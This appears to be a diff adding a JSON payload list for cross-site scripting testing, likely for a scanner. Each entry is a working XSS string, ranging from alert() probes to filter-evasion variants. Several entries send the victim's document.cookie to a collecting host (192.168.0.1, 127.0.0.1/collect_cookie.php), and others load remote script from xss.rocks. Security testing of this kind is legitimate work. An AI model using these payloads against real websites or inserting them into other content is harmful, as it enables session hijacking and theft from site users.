@@ -1,0 +1,53 @@
+[
+    {
+        "xss_injection": "tag",
+        "xss_string": "<script>alert(0)</script>"
+    },
+    {
+        "xss_injection": "tag",
+        "xss_string": "<img src=x onerror=alert(0)>",
+        "_source": "https://www.google.com/about/appsecurity/learning/xss/"
+    },
+    {
+        "xss_injection": "tag",
+        "xss_string": "<svg/onload=alert('XSS')>",
+        "_source": "https://brutelogic.com.br/blog/xss101/"
+    },
+    {
+        "xss_injection": "tag",
+        "xss_string": "<svg onload=fetch('//192.168.0.1/?cookie='+document.cookie)>",
+        "_source": "https://brutelogic.com.br/blog/xss101/"
+    },
+    {
+        "xss_injection": "tag",
+        "xss_string": "<a onclick=\"document.location='http://127.0.0.1/collect_cookie.php?cookie='+escape(document.cookie);\" href=\"#\">Click here!</a>",
+        "_source": "TODO"
+    },
+    {
+        "xss_injection": "tag",
+        "xss_string": "<iframe width='0' height='0' frameborder='0' src='<script>document.location='http://127.0.0.1/collect_cookie.php?cookie='+escape(document.cookie);</script>' />"
+    },
+    {
+        "xss_injection": "tag",
+        "xss_string": "<script src=http://xss.rocks/xss.js></script>"
+    },
+    {
+        "xss_injection": "tag",
+        "xss_string": "<script src=http://xss.rocks/xss.js></script>",
+        "_comment": "TODO: add URL obfuscation" 
+    },
+    {
+        "xss_injection": "tag",
+        "xss_string": "<div style=font-size:500px onmouseover=alert(1)>Over there!"
+    },
+    {
+        "xss_injection": "tag",
+        "xss_string": "<frameset><frame src onload=alert(1)>"
+    },
+    {
+        "xss_injection": "tag",
+        "xss_string": "<table><thead%0Cstyle=font-size:700px%0Donmouseover%0A=%0Bconfirm(1)%09><td>AAAAAAAAA"
+    }
+
+
+]
